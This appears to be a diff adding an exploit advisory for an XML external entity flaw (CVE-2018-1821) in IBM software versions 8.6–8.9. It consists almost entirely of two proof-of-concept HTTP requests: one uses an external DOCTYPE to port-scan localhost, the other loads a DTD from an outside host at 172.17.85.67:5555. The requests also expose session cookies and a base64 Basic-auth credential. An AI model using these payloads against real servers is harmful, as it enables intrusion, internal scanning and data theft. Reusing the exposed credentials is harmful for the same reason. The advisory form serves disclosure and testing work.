@@ -1,0 +1,48 @@
+# Exploit Title: [XML External Entity Injection (XXE)]
+# Date: [2018-12-18]
+# Exploit Author: [Mohamed M.Fouad - From SecureMisr Company]
+# Vendor Homepage: [https://www-01.ibm.com/support/docview.wss?uid=ibm10744149]
+# Version: [v8.6 - v8.7 - v8.8 - v8.9] (REQUIRED)
+# Tested on: [Windows 10]
+# CVE : [CVE-2018-1821]
+
+POC#1: Port Scanning:
+======================
+POST /res/api/v1/ruleapps?csrf_token=kgwGZpsLIpCrCuS3s2mLS4%2BuXKM%3D HTTP/1.1
+Host: 172.25.28.35:9443
+Connection: close
+Content-Length: 83
+Origin: https://172.25.28.35:9443
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+Content-Type: application/xml
+Accept: */*
+Referer: https://172.25.28.35:9443/res/protected/rest.jsf
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=0000EKq5uAZFEICNv26D32qeVid:1c4i4k9om; LtpaToken2=Py4PGunQHKXqtYpW0R+1XxlcENqSI/5/RCinV7Cl0g8WlAWAfff5IAPwHJDWZL+LFtTTT+tfmADp38hW7xVieS74jJB79m1IDfIpeGvKOzJ99NmTkV0uPm22vdUZp8qKF8Xt3J7mO5L1tTohHdIg/eXZj2hZxWfLYf2KyGyqJ+D16g4fIu7zazZProW9RDgdoGpppM/Wfkxst8iQAj6+4a3tdyJkNJ8+QdPeakHYCbFA6aTcNXncwkWsKDwznGZ30pLXSxp8wKJaESkkuY5F4w6lLGVw7d6p34M6aDQGixkR4J7I+ZLQ0OE9Fzt6Aq+AETBcMLFqPOpPEMtrZkkExey8Lc9hMRs5tAVXramTT6h38uquu/2DyqfOaJeRATM8tO4UZs7clSsXQjsbU9s/ueFZR8YA9qrXUTChoysZtCrXTdmqs87FiqwLZNzWI7bUjf8crCNDJgYzPVsnK0Oo46Hdi8nlKhvr8pzxSMblS4gjgSsKo8MYDi/uzexkqMB3ddTGp9vUVEG30L9Ya9Z4v7D9WusN7fJxn1x3g9NmtWMe6uCsyIRFU0+RADGsKYfsC09NItUciIo9GnJdrsla9TnaqVaiQhu85GpT6LPrZs0wPjV6WYGTOLMMd2Z/VVjaTn9pU5mPQlT/dFVbLoJvNI+uS66GP1HmXgj8ofe5J/o=
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "ftp://127.0.0.1:21">
+
+
+
+POC#2: Using External DTD File:
+======================================
+POST /rest/bpm/monitor/events HTTP/1.1
+Host: 172.25.28.41:9445
+Connection: close
+Cache-Control: max-age=0
+Authorization: Basic Ym1hZG1pbjpibWFkbWlu
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Content-Type: text/xml
+SOAPAction: "CBE_FOR_EACH_TRANSACTION_REQUESTI"
+Accept-Language: en-US,en;q=0.9
+Cookie: JSESSIONID=00002W7K2hStpCQu03vef0J3Lyt:1cd2vk5q4; com.ibm.wbimonitor.UserName=bmadmin; MUMLogoutURL=https://172.25.28.41:9445/mum/logout; LtpaToken2=RKW0datOtQMYCPkxs8YAKklRMLNsYHWe264hjvsRMBjvc6AW29/OVsNJA8pO8MQQMBXOfBuWtNQPWVJ/cw55YdzVyfPdLG8d+cQ77kt7XiE77scfNfPCVU77zcFaG8qVO8xUXXX5U4+nTxlXNIEQR1iMPN2+w3rnAIZcDL7vgK3YN0QPGAn8rQmrYswXoBf6WmgI8uc0yA/PNRIXL5Lt9DeqJCU0C/E2FvJ9nK8T8uQqPPiS63EOutom825arJYLV9zndN1ArgdwAAOMO61Top9bM/VsMh/ryshaj6CsfrmaBvFt5FIVfvLN5u2iEQq0KVCxPAlH5yceSQV5gP884rhiN9M1N/QOQ54k3F1ZMBkfhDofJyDqsXMOMCaTXTsoyWhsC/KLPcjC3thQQxxijDrM7Yql411tUDv08xdDzu7apEF5QBuGrVd2Pgg5luKWmcao5BduwSXwaKJEQXnULAbYacr48gol7aHJucPhY6JqkFgvjvV4XfFNM1jsWbA+09KD2F0GALjNzLMb54sI5RLhHLVZu/LBL3RWrZFPPSE0D9YW2LrKtNGHBkFeuw/I8ULL/JjlfWHHheZug5t45H1oNPHpQp843GwTAbWGtNCb7rZLgA7+jCR2OYmtg8vrlJFvSzhSxg6ahYppX1PouekOuNvC7EvR51PHcw2qJRE=
+Content-Length: 99
+
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE data SYSTEM "http://172.17.85.67:5555/mydtd.dtd">
